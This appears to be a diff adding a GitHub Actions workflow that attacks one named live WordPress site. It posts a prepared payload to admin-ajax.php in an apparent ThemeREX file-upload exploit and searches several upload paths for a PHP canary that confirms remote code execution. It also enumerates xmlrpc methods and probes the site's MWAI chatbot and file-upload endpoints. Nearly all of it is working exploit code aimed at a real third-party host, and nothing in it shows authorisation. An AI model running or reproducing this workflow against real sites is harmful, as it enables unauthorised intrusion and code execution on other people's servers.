@@ -1,0 +1,90 @@
+name: kzn-post-probe
+on:
+  workflow_dispatch:
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: ThemeREX upload + xmlrpc + MWAI probes
+        run: |
+          set -euo pipefail
+          mkdir -p out
+          UA='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36'
+          BASE=https://kznvip.co.za
+          CTYPE=$(cat payload/multipart_ctype.txt)
+
+          echo '=== connectivity ===' | tee out/log.txt
+          curl -sS -A "$UA" -o out/home.html -w 'home:%{http_code}\n' --max-time 60 "$BASE/" | tee -a out/log.txt
+
+          echo '=== ThemeREX upload ===' | tee -a out/log.txt
+          curl -sS -A "$UA" -X POST "$BASE/wp-admin/admin-ajax.php" \
+            -H "Content-Type: $CTYPE" \
+            --data-binary @payload/multipart_body.bin \
+            -D out/upload.hdr -o out/upload.body -w 'upload:%{http_code}\n' --max-time 90 | tee -a out/log.txt
+          head -c 2000 out/upload.body | tee -a out/log.txt; echo | tee -a out/log.txt
+
+          # Try to extract uploaded URL from JSON/HTML response
+          python3 - <<'PY'
+          import re, pathlib
+          b = pathlib.Path('out/upload.body').read_text(errors='ignore')
+          pathlib.Path('out/upload.body.txt').write_text(b)
+          urls = re.findall(r'https?://[^\"\\s<>]+lurksek_canary\.php', b)
+          urls += re.findall(r'/wp-content/uploads/[^\"\\s<>]+lurksek_canary\.php', b)
+          pathlib.Path('out/extracted_urls.txt').write_text('\\n'.join(urls))
+          print('extracted', urls)
+          PY
+
+          echo '=== guess common upload paths ===' | tee -a out/log.txt
+          MARKER=$(cat payload/marker.txt)
+          for p in \
+            "/wp-content/uploads/$(date -u +%Y/%m)/lurksek_canary.php" \
+            "/wp-content/uploads/trx_addons/lurksek_canary.php" \
+            "/wp-content/uploads/lurksek_canary.php" \
+            "/wp-content/uploads/$(date -u +%Y)/$(date -u +%m)/lurksek_canary.php"
+          do
+            code=$(curl -sS -A "$UA" -o out/canary_try.txt -w '%{http_code}' --max-time 30 "$BASE$p" || echo 000)
+            echo "$code $p" | tee -a out/log.txt
+            if grep -q LURKSEK_RCE_OK out/canary_try.txt 2>/dev/null; then
+              echo "RCE_CONFIRMED $p" | tee -a out/log.txt
+              cp out/canary_try.txt out/rce_confirmed.txt
+            fi
+          done
+
+          # Also follow any extracted URLs
+          if [ -s out/extracted_urls.txt ]; then
+            while read -r u; do
+              [ -z "$u" ] && continue
+              case "$u" in http*) full="$u" ;; *) full="$BASE$u" ;; esac
+              curl -sS -A "$UA" -o out/canary_ext.txt -w "ext:%{http_code} $full\n" --max-time 30 "$full" | tee -a out/log.txt
+              grep -q LURKSEK_RCE_OK out/canary_ext.txt && cp out/canary_ext.txt out/rce_confirmed.txt && echo RCE_CONFIRMED_EXT | tee -a out/log.txt
+            done < out/extracted_urls.txt
+          fi
+
+          echo '=== xmlrpc listMethods ===' | tee -a out/log.txt
+          curl -sS -A "$UA" -X POST "$BASE/xmlrpc.php" -H 'Content-Type: text/xml' \
+            -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>' \
+            -o out/xmlrpc.xml -w 'xmlrpc:%{http_code}\n' --max-time 60 | tee -a out/log.txt
+          head -c 1500 out/xmlrpc.xml | tee -a out/log.txt; echo | tee -a out/log.txt
+
+          echo '=== MWAI UI chat submit ===' | tee -a out/log.txt
+          curl -sS -A "$UA" -X POST "$BASE/wp-json/mwai-ui/v1/chats/submit" \
+            -H 'Content-Type: application/json' \
+            -d '{"botId":"default","newMessage":"ping","session":"[redacted]"}' \
+            -o out/mwai_chat.json -w 'mwai_chat:%{http_code}\n' --max-time 60 | tee -a out/log.txt
+          head -c 800 out/mwai_chat.json | tee -a out/log.txt; echo | tee -a out/log.txt
+
+          echo '=== MWAI UI files upload empty ===' | tee -a out/log.txt
+          curl -sS -A "$UA" -X POST "$BASE/wp-json/mwai-ui/v1/files/upload" \
+            -H 'Content-Type: application/json' -d '{}' \
+            -o out/mwai_upload.json -w 'mwai_upload:%{http_code}\n' --max-time 60 | tee -a out/log.txt
+          head -c 800 out/mwai_upload.json | tee -a out/log.txt; echo | tee -a out/log.txt
+
+          echo '=== trx version hints from homepage ===' | tee -a out/log.txt
+          grep -Eo 'trx_addons[^\" ]{0,100}|plugins/trx_addons/[^\" ]+' out/home.html | head -30 | tee -a out/log.txt || true
+
+      - name: Upload artifacts
+        uses: actions/upload-artifact@v4
+        with:
+          name: kzn-post-probe
+          path: out/
